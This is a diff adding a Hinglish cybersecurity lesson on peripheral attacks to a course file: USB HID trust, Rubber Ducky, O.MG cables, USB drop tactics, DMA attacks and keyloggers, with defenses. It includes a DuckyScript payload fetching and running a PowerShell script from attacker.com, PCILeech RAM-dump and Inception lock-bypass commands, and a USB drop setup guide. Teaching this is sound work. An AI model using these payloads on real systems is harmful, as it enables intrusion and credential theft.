@@ -377,33 +377,474 @@ Yeh module isliye important hai kyunki jab tum malware analyze karo, CTF karo, y
   },
 
   "cb-02": {
-    title: "Input & Output Devices",
-    image: "https://images.unsplash.com/photo-1587829741301-dc798b83add3?w=900&fit=crop&auto=format",
-    tagline: "Computer se baat kaise karein aur woh kaise jawab deta hai — samjho!",
+    title: "Input/Output & Peripheral Security",
+    image: "https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=900&fit=crop&auto=format",
+    tagline: "USB lagan se pehle socho — woh keyboard hai ya hacker ka weapon?",
     sections: [
       {
-        heading: "⌨️ Input Devices — Computer Ko Data Dena",
-        content: `Input device woh cheez hai jisse tum computer ko data ya instructions dete ho.\n\n**Keyboard** — Sabse common input device. Har key ek specific character ya action represent karti hai. QWERTY layout kyun hai? History mein typewriters ke jamane mein common letters alag rakhe jaate the taki keys jam na jaayein!\n\n**Mouse** — 1964 mein invent hua tha Douglas Engelbart ne. Pointer ko screen pe move karta hai. Optical mouse mein LED light hoti hai jo surface ko scan karti hai.\n\n**Touchscreen** — Input aur output dono — tum touch karte ho (input) aur display bhi dekh rahe ho (output).\n\n**Microphone** — Sound ko digital signal mein convert karta hai. Voice assistants (Siri, Google) isi se kaam karte hain.\n\n**Webcam/Camera** — Images aur video capture karta hai.\n\n**Scanner** — Physical documents ko digital format mein convert karta hai.\n\n**Biometric Devices** — Fingerprint scanner, retina scanner — security ke liye use hote hain.`,
+        heading: "🔌 USB Architecture — OS Ise Kaise Dekhta Hai",
+        content: `USB (Universal Serial Bus) 1996 mein introduce hua — idea tha ek standard connector jo sab kuch support kare. Lekin isi "universality" ne ek badi security problem create ki jo aaj bhi exist karti hai.
+
+**USB Device Classes — OS Ko Kya Bataya Jaata Hai:**
+Jab koi USB device connect hoti hai, woh OS ko apna "class" batati hai — matlab kya type ki device hai:
+
+| USB Class | Class Code | Examples |
+|-----------|-----------|---------|
+| HID (Human Interface Device) | 0x03 | Keyboard, Mouse, Gamepad |
+| Mass Storage | 0x08 | Pen drive, External HDD |
+| Audio | 0x01 | Headset, Mic, Speaker |
+| Communications | 0x02 | Network adapter, Modem |
+| Vendor Specific | 0xFF | Custom devices |
+
+**Critical Security Flaw — OS Blindly Trust Karta Hai:**
+OS kisi bhi USB device ka class code check karke usse woh permission deta hai jo us class ke liye defined hai. Koi cryptographic authentication nahi hoti. Koi "are you really a keyboard?" verification nahi hoti.
+
+Iska matlab:
+\`\`\`
+Normal keyboard plug karo → OS: "HID device, keyboard hai, keystrokes accept karunga" ✓
+Rubber Ducky plug karo  → OS: "HID device, keyboard hai, keystrokes accept karunga" ✓
+                                  ^ Attacker ka device, OS ko fark nahi pata!
+\`\`\`
+
+**USB Descriptor — Device Ki "Business Card":**
+Har USB device connect hone pe ek "descriptor" bhejti hai:
+- Vendor ID (VID): manufacturer ka ID (e.g., 0x05AC = Apple)
+- Product ID (PID): specific product
+- Device Class: HID/Storage/Audio etc.
+- Device String: "Apple Keyboard" jaisa naam
+
+Rubber Ducky, O.MG Cable — yeh sab Apple, Dell, HP ke VID/PID spoof kar sakte hain. Task Manager mein "Apple Keyboard" dikhega even if woh attack tool hai.`,
       },
       {
-        heading: "🖥️ Output Devices — Computer Ka Jawab",
-        content: `Output device woh cheez hai jo computer ka processed result tumhe dikhata hai.\n\n**Monitor/Screen** — Sabse important output device. Resolution ka matlab hai kitne pixels hain — 1920×1080 (Full HD) mein 2 million se zyada pixels hain!\n\n**Printer** — Digital data ko physical paper pe print karta hai. Inkjet printer mein ink spray hoti hai, laser printer mein toner powder.\n\n**Speaker/Headphones** — Digital audio signal ko sound waves mein convert karta hai. Amplifier signal ko boost karta hai.\n\n**Projector** — Monitor jaisa kaam karta hai lekin bade surface pe project karta hai.\n\n**Haptic Feedback** — Phone ka vibration bhi ek output hai — physical sensation ke form mein!`,
+        heading: "🦆 Rubber Ducky — Keyboard Se Tez Hacker",
+        content: `Rubber Ducky, Hak5 ka product hai — ek innocent dikhne wala yellow USB drive jo actually ek powerful attack tool hai. $50 mein available, lekin kisi bhi corporate network ko minutes mein compromise kar sakta hai.
+
+**Rubber Ducky Kaise Kaam Karta Hai:**
+
+\`\`\`
+Step 1: Attacker DuckyScript mein payload likhta hai
+        (simple text language — commands batata hai kya type karna hai)
+
+Step 2: Script Rubber Ducky mein flash hoti hai
+        (microSD card pe, 32GB+ storage possible)
+
+Step 3: Victim ke computer mein plug hota hai
+
+Step 4: OS immediately "keyboard" samajhta hai — no driver install, no prompt
+        Windows: USB recognize = keyboard ready in ~3 seconds
+
+Step 5: Pre-programmed keystrokes automatically type hote hain
+        300+ words per minute typing speed — human se 3x fast!
+
+Step 6: Payload complete — attacker ka kaam ho gaya
+\`\`\`
+
+**Real DuckyScript Payload Example (Windows Reverse Shell):**
+\`\`\`ducky
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+ENTER
+\`\`\`
+Yeh 3 seconds mein: Win+R dabaya → PowerShell hidden window mein khola → attacker ka script download aur execute kiya → reverse shell established!
+
+**Advanced Payloads Jo Attackers Use Karte Hain:**
+- New admin user create karna silently
+- WiFi password steal karna (Windows Credential Store se)
+- Browser saved passwords export karna
+- Reverse shell establish karna (attacker remote control)
+- Keylogger install karna
+- BitLocker recovery key steal karna
+
+**Famous Use Cases:**
+- 2020 Tesla Factory (Nevada): Employee ne $1 million bribe leke Rubber Ducky use karne ki koshish ki malware deploy karne ke liye
+- Government offices pe targeted attacks — "lost USB" scenario
+- Red team engagements mein physical access assessment ke liye
+
+**Bash Bunny — Rubber Ducky ka Bada Bhai:**
+Hak5 ka hi product, lekin zyada powerful — multiple attack modes, can be keyboard + storage simultaneously, Linux OS inside, Ethernet adapter bhi ban sakta hai.`,
       },
       {
-        heading: "🔄 Input-Output Dono — Combo Devices",
-        content: `Kuch devices dono kaam karte hain:\n\n**Touchscreen** — Touch karo (input) + display dekho (output)\n\n**Headset with mic** — Suno (output) + bolo (input)\n\n**Modem/Router** — Data bhejo (input) + receive karo (output)\n\n**USB Flash Drive** — Data daalo (input) + data nikalo (output)\n\n**Cybersecurity angle:** Har input device ek potential attack vector hai! USB drop attack mein hacker ek malicious USB drive chhod deta hai — koi usse uthata hai, plug karta hai, aur system hack ho jaata hai. Isliye kabhi unknown USB devices use mat karo!`,
+        heading: "🔗 O.MG Cable — Cable Dekho, Hack Ho Jao",
+        content: `O.MG Cable (pronounced "Oh My God" Cable) ne 2019 mein DefCon conference mein duniya ko shock kiya. Ek normal Apple Lightning cable ki tarah dikhne wala device jo actually ek full attack platform hai.
+
+**O.MG Cable Ki Anatomy:**
+\`\`\`
+[USB-A Plug] ════════════════════════ [Lightning/USB-C tip]
+                    ↑
+         Yahan andar chhupa hai:
+         - ARM Cortex-M microcontroller
+         - 802.11b/g/n WiFi chip
+         - 32KB Flash storage
+         - Tiny PCB jo wire ke andar fit hoti hai
+         
+Bahar se: Bilkul Apple cable jaisi — same texture, same weight, same length
+Andar se: Full attack computer
+\`\`\`
+
+**Kaise Kaam Karta Hai:**
+1. **Setup:** Attacker O.MG cable ko apne phone se WiFi hotspot se connect karta hai
+2. **Plant:** Cable victim ke desk pe rakh deta hai ya "apni charger" ke roop mein deta hai
+3. **Wait:** Victim apna laptop/phone charge karta hai cable se
+4. **Attack:** Attacker apne phone se O.MG Cable ke web interface pe jaata hai
+5. **Execute:** Keystrokes send karta hai — victim ke device pe execute hote hain
+6. **Range:** 40+ meters tak WiFi range, ya internet bridge mode mein unlimited range!
+
+**O.MG Cable Variants (2023):**
+- **O.MG Cable (Basic):** $119 — USB-A to Lightning
+- **O.MG Cable Elite:** $179 — bidirectional, keylogging built-in, geofencing
+- **O.MG Adapter:** $79 — dongle jo kisi bhi cable ko malicious banata hai
+
+**Geofencing Feature (Elite):**
+Cable sirf specific WiFi network (e.g., office WiFi SSID) detect karne ke baad activate hoti hai — baaki jagah completely dormant rehti hai. Forensics ke time wire test karo — kuch nahi milega.
+
+**Keylogging Mode:**
+O.MG Elite cable keystrokes record karke store karti hai — attacker baad mein retrieve kar sakta hai. Ek hafte baad aao, stored keystrokes download karo — passwords, documents sab.
+
+**Defense:**
+- USB data blocker ("USB condom") use karo — charge hone do, data transfer block
+- Apni khud ki cable use karo hamesha
+- Office mein unknown cables mat use karo
+- USB-C pe bhi O.MG cable available hai — cable trust mat karo`,
       },
       {
-        heading: "🛡️ Security Angle — I/O Devices Aur Threats",
-        content: `IT professional hone ke naate, input/output devices ke security risks jaanna zaroori hai:\n\n**Keylogger** — Ek malware jo har keyboard input record karta hai. Tum password type karo — woh record ho jaata hai aur hacker ke paas pahunch jaata hai.\n\n**Screen Capture Malware** — Jo kuch screen pe dikha, woh capture karke bhej deta hai.\n\n**Evil Maid Attack** — Jab tum hotel ka laptop unattended chhod dete ho, koi physical USB se malware install kar sakta hai.\n\n**Protect Yourself:**\n• Unknown USB kabhi mat lagao\n• Public computers pe passwords mat type karo\n• Privacy screen protector lagao\n• Webcam cover use karo (haan, seriously!)`,
+        heading: "🪤 USB Drop Attack — Psychology Se Hack",
+        content: `USB Drop Attack pure technical skill nahi maangta — yeh human psychology exploit karta hai. Aur research show karta hai ki yeh bahut effective hai.
+
+**2016 University of Illinois Research:**
+Researchers ne 297 USB drives University campus pe drop kiye. Result:
+- **48% drives plug kiye gaye** (143 out of 297)
+- **98% cases mein: pehle file open ki gayi** (to see what's on it)
+- Average time from drop to plug: **6 hours**
+- Most common reason: "Lost kisi ka hai, wapas dena chahta tha"
+
+**Attack Setup — Step by Step:**
+\`\`\`
+Step 1: USB prepare karo
+        - Rubber Ducky ya malware-loaded regular drive
+        - Label lagao: "SALARY Q3 2024 CONFIDENTIAL"
+          ya "HR - Employee Performance Reviews"
+          ya "Personal Photos - DELETE IF FOUND"
+        - Yeh labels curiosity aur legitimate reasons dono create karte hain
+
+Step 2: Location select karo
+        - Company parking lot (employees apna hi company samjhenge)
+        - Reception desk ke paas
+        - Elevator ya pantry
+        - Printer ke paas (IT department lagega)
+
+Step 3: Drop karo aur wait karo
+        - Natural dikho — gira di jaisi acting
+        - CCTV angle check karo (advanced attackers)
+        
+Step 4: Payload execute
+        - Rubber Ducky: keystrokes immediately
+        - Regular malware drive: victim khud file open kare
+        - AutoRun (purane Windows): automatic execution
+\`\`\`
+
+**India-Specific Context:**
+- Corporate offices mein USB drop attacks documented hain
+- 2022 mein ek Indian bank mein insider threat ne USB use karke data exfiltrate kiya
+- Government offices pe targeted attacks mein physical USB use hua
+- CERT-In ne advisory issue ki hai about physical security
+
+**Psychological Tricks Used:**
+| Label | Psychology Used |
+|-------|----------------|
+| "Salary Data 2024" | Greed/curiosity |
+| "Company Strategy - Confidential" | Professional curiosity |
+| "Personal - Medical Reports" | Empathy (wapas karna chahta hai) |
+| "Wedding Photos - Help Return!" | Emotional appeal |
+| No label at all | Basic "what's in this?" curiosity |
+
+**Defense Against USB Drop:**
+\`\`\`
+Technical:
+✓ USB port physically block karo (USB port blockers — physical locks)
+✓ Group Policy: USB storage disable karo (Windows)
+  Computer Config → Admin Templates → System → Removable Storage
+✓ Only whitelisted USB VID/PID allow karo
+✓ USB Device Control software (Endpoint security tools)
+
+Awareness Training:
+✓ Employees ko batao: unknown USB = company laptop se pehle IT ko do
+✓ "If you find a USB, bring it to IT" — never plug it yourself
+✓ Regular phishing + physical security training
+\`\`\``,
+      },
+      {
+        heading: "⚡ DMA Attacks — Thunderbolt se RAM Direct Read",
+        content: `DMA (Direct Memory Access) attacks ek advanced physical attack technique hai jo high-speed ports ka use karke CPU ko bypass karke directly RAM read/write karta hai — bina OS login ke, bina any authentication ke.
+
+**DMA Kya Hota Hai — Normal Use:**
+Performance ke liye, kuch high-speed operations CPU ko involve kiye bina directly memory access karte hain:
+- Network card: received packets directly RAM mein store karta hai (CPU involve nahi)
+- GPU: frame buffer directly video RAM mein
+- Storage controller: disk data directly RAM mein
+
+Yahi efficiency feature attackers exploit karte hain.
+
+**Vulnerable Ports:**
+| Port | Protocol | DMA Capable | Risk Level |
+|------|---------|-------------|-----------|
+| Thunderbolt 1/2/3/4 | PCIe | ✅ Yes | 🔴 High |
+| FireWire (IEEE 1394) | FireWire | ✅ Yes | 🔴 High |
+| ExpressCard | PCIe | ✅ Yes | 🔴 High |
+| Regular USB 3.x | USB | ❌ No | 🟢 Low |
+| USB4 (Thunderbolt mode) | PCIe | ✅ Yes | 🔴 High |
+
+**PCILeech — Real DMA Attack Tool:**
+
+\`\`\`
+Hardware needed:
+- Attacker ka laptop
+- PCILeech-compatible DMA card (~$30-$200)
+  e.g., Screamer M2, FPGA-based boards, PCIe expansion cards
+- Thunderbolt cable ya PCIe adapter
+
+Attack steps:
+1. Target ka laptop lock screen pe hai (Windows Hello, PIN, etc.)
+   → Normal attacker ke liye: can't get in
+   
+2. Attacker Thunderbolt cable connect karta hai
+   → PCILeech FPGA device daata hai port mein
+   
+3. pcileech command run karta hai:
+   pcileech.exe dump -out memory.raw -length 0x100000000
+   → Poori 4GB RAM dump ho gayi ek file mein!
+   
+4. Dump analyze karo:
+   - LSASS process memory → NTLM hashes → password crack
+   - Browser memory → session cookies → account hijack
+   - Encryption keys → disk decrypt
+   - Plaintext passwords → direct use
+\`\`\`
+
+**Inception Tool — Direct Memory Patch:**
+\`\`\`bash
+# Inception: MacOS FileVault bypass demo (2012 se known)
+python3 inception.py -t 1394  # FireWire use karo
+
+# Yeh kya karta hai:
+# RAM mein OS ka authentication check dhundta hai
+# Authentication function ka return value patch karta hai
+# Ek specific memory address pe 0x01 write karta hai
+# Result: Lock screen "Accept any password" mode mein aa jaata hai!
+# Victim ka laptop unlock → bina sahi password ke
+\`\`\`
+
+**Real World Cases:**
+- 2012: Kon Tiki project — academic researchers ne Linux aur MacOS both ko FireWire se bypass kiya
+- Corporate espionage: targeted executives ke laptops pe hotel rooms mein
+- Law enforcement: US FBI aur police Thunderbolt-based tools use karte hain locked devices ke liye
+
+**Defense:**
+\`\`\`
+1. IOMMU Enable karo (BIOS/UEFI setting):
+   - Intel: VT-d (Virtualization Technology for Directed I/O)
+   - AMD: AMD-Vi
+   - IOMMU DMA memory access restrict karta hai — device sirf allocated memory access kar sakta hai
+   
+2. Thunderbolt Security Level (UEFI mein):
+   - "No Security" — any device
+   - "User Authorization" — ✓ user approval chahiye
+   - "Secure Connect" — cryptographic pairing
+   - "Display Port Only" — ✓ safest, DMA disable
+   
+3. OS-level settings:
+   Windows: Kernel DMA Protection enable karo (Windows 10 v1803+)
+   macOS: System Preferences → Security → "Require password immediately"
+   Linux: echo 1 > /sys/bus/thunderbolt/devices/0-0/authorized (whitelist)
+   
+4. Physical security:
+   - Unattended laptop NEVER chhodo
+   - Port blockers use karo (physical Thunderbolt port locks)
+   - High-security environments: Thunderbolt disable karo BIOS mein
+\`\`\``,
+      },
+      {
+        heading: "🛡️ Defense & Detection — I/O Security Complete Guide",
+        content: `Ab sab attacks pata hain — toh defend kaise karein? Yeh practical guide hai jo tum aaj se follow kar sakte ho.
+
+**Tier 1 — Personal Defense (Aaj Se Karo):**
+
+\`\`\`
+1. Webcam Cover:
+   - Physical tape ya sliding cover
+   - Mark Zuckerberg, FBI Director James Comey — dono use karte hain
+   - $2-5 mein milta hai Amazon pe
+
+2. Unknown USB Rule:
+   - Koi bhi unknown USB — NEVER plug directly
+   - IT department ko do
+   - Khud plug karke "dekhne ki curiosity" = ek common mistake
+
+3. USB Data Blocker ("USB Condom"):
+   - Public charging stations pe USE KARO HAMESHA
+   - Sirf power pins connect hote hain, data pins cut hote hain
+   - PortaPow USB Data Blocker — ~$10
+   - Airport, mall, train stations pe charging = potential juice jacking
+
+4. Microphone Awareness:
+   - Sensitive conversations mein phone room se bahar rakho
+   - Laptop close karo — microphone still active on some models
+   - Physical mic mute button (some laptops pe hota hai)
+\`\`\`
+
+**Tier 2 — Corporate/Office Defense:**
+
+\`\`\`
+USB Port Control:
+✓ Windows Group Policy: USB storage disable
+  gpedit.msc → Computer Config → Admin Templates → 
+  System → Removable Storage Access → "All removable storage: Deny all access"
+
+✓ USB Device Whitelisting (Endpoint Security):
+  - Carbon Black, CrowdStrike, Symantec Endpoint — USB device control features
+  - Sirf specific VID/PID allow karo (company-issued devices)
+  - Rogue USB detect hone pe alert
+
+Physical Port Security:
+✓ USB Port Blockers — physical locks jo port mein fit hote hain
+✓ Thunderbolt disable in BIOS for non-required machines
+✓ IOMMU enable — all machines pe standard config
+\`\`\`
+
+**Tier 3 — Detection — Kya Koi HID Attack Hua?**
+
+\`\`\`
+Windows Event Logs check karo:
+Event ID 2003 = USB device connected
+Event ID 2100 = PnP activity
+
+PowerShell — recent USB history:
+Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Enum\USB\*\*' |
+  Select FriendlyName, LocationInformation | Format-Table
+
+Linux — USB history:
+sudo journalctl | grep -i "usb\|hid"
+sudo dmesg | grep -i "hid\|usb"
+cat /var/log/syslog | grep "USB"
+
+Suspicious signs:
+⚠️ Keyboard device connected — lekin koi new keyboard nahi lagaya
+⚠️ Rapid keypresses logged (300+ wpm = not human)
+⚠️ PowerShell launched soon after USB connect
+⚠️ New process started within seconds of USB connect
+\`\`\`
+
+**India Specific — CERT-In Guidelines:**
+CERT-In (Indian Computer Emergency Response Team) ne physical security ke liye guidelines issue ki hain:
+- Government offices: USB ports physically blocked hone chahiye classified systems pe
+- Bank servers: Port security mandatory
+- Critical infrastructure: USB se booting disable
+- Insider threat program: USB usage monitoring zaroori
+
+Hacking ke liye physical security ignore mat karo — "air-gapped" networks (jo internet se connected nahi hain) bhi USB attacks se compromise hue hain. Stuxnet (2010) exactly aisa attack tha — Iran ke nuclear plant ka air-gapped system USB se compromised hua.`,
+      },
+      {
+        heading: "🔍 Keyloggers aur Side-Channel — Invisible Threats",
+        content: `Kuch attacks bilkul invisible hote hain — na koi malware dikhta hai, na koi device. Sirf physics aur maths se tumhare keystrokes capture ho jaate hain.
+
+**Types of Keyloggers:**
+
+**1. Software Keyloggers:**
+\`\`\`
+- OS-level: keyboard hook use karte hain (SetWindowsHookEx on Windows)
+- Browser extension: form data capture
+- Kernel-level: device driver jo OS se neeche kaam karta hai
+- Hypervisor-based: VM monitor karta hai host keystrokes
+
+Detection: Process Monitor, Autoruns, AV scan
+\`\`\`
+
+**2. Hardware Keyloggers:**
+\`\`\`
+- PS/2 aur USB inline: keyboard aur computer ke beech plug hota hai
+  → Flash memory mein store karta hai
+  → Attacker baad mein physically retrieve karta hai
+  
+- Wireless keylogger: keystroke capture + WiFi transmit
+  → Real-time remote access
+  
+- BIOS-level keylogger: firmware mein embedded
+  → OS reinstall ke baad bhi kaam karta hai!
+  → Detection almost impossible
+\`\`\`
+
+**3. Acoustic Side-Channel Attack:**
+\`\`\`
+Discovery: 2023 study — laptop keyboard ka sound se keystrokes recover
+
+How:
+- Har key press ek unique acoustic signature produce karta hai
+  (key ka position, travel distance, switch type se sound alag hoti hai)
+- Zoom/Teams call ke audio se ya room microphone se record karo
+- Deep learning model train karo keyboard sounds pe
+- Result: 93% accuracy pe keystrokes recover!
+
+What can be recovered:
+- Passwords (characters by character)
+- Sensitive documents
+- PIN numbers (numeric keys distinctive sounds)
+
+Defense:
+- Random noise play karo typing ke time (white noise)
+- Virtual keyboard use karo (mouse click = same sound)
+- Touch typing software keyboards pe — softer
+\`\`\`
+
+**4. Electromagnetic Side-Channel (TEMPEST):**
+\`\`\`
+- Har electronic device electromagnetic radiation emit karta hai
+- Keyboard ke wire se, monitor ke display signal se, CPU se
+- Specialized antenna aur receiver se signals capture karo
+- Van Eck Phreaking: monitor ka display remotely reconstruct karna
+  → 1985 mein first demonstrated
+  → Modern displays pe bhi partially possible
+
+TEMPEST classified program:
+- NATO SDIP-27/SDIP-29, US NSA standards
+- Government offices use Faraday cages (rooms lined with copper mesh)
+- Classified systems: TEMPEST-certified hardware mandatory
+- India: DRDO aur defence establishments TEMPEST requirements follow karte hain
+\`\`\`
+
+**Practical Exercise — Apna System Check Karo:**
+
+Windows pe check karo koi unauthorized keyboard device toh nahi:
+\`\`\`powershell
+# Device Manager se keyboards list:
+Get-PnpDevice -Class Keyboard | Select Name, Status, InstanceId
+
+# USB history:
+reg query "HKLM\SYSTEM\CurrentControlSet\Enum\USB" /s | findstr "FriendlyName"
+\`\`\`
+
+Linux pe:
+\`\`\`bash
+# Connected HID devices:
+lsusb | grep -i "hid\|keyboard\|input"
+
+# Input events:
+ls /dev/input/
+cat /proc/bus/input/devices | grep -A5 "Keyboard"
+\`\`\`
+
+Agar unexpected keyboard device dikh rahe hain — immediately disconnect karo aur IT ko inform karo.`,
       },
     ],
     keyPoints: [
-      "Input devices: keyboard, mouse, mic, scanner, webcam",
-      "Output devices: monitor, printer, speaker, projector",
-      "Combo devices: touchscreen, headset, USB drive",
-      "Keylogger sabse common input-based attack hai",
-      "Unknown USB devices = potential security threat",
+      "OS har USB HID device pe blindly trust karta hai — koi authentication nahi hoti, isliye Rubber Ducky/O.MG Cable kaam karta hai",
+      "Rubber Ducky = $50 ka USB device jo 300+ wpm speed se keystrokes type karta hai — seconds mein system compromise",
+      "O.MG Cable = Apple cable jaisi dikhti hai, andar WiFi + microcontroller, 40+ meter range se control",
+      "USB Drop Attack: 2016 study mein 48% USB drives plug kiye gaye — curiosity sabse badi vulnerability hai",
+      "DMA Attacks: Thunderbolt/FireWire se CPU bypass karke directly RAM read — bina login ke encryption keys, passwords",
+      "Acoustic side-channel: 2023 mein Zoom call audio se 93% accuracy se keystrokes recover hue",
+      "Defense: USB data blocker, IOMMU enable, USB whitelisting, webcam cover, unknown USB kabhi mat lagao",
+      "Stuxnet (2010): Iran nuclear plant ka air-gapped system USB se compromise hua — physical security = network security",
     ],
   },
 
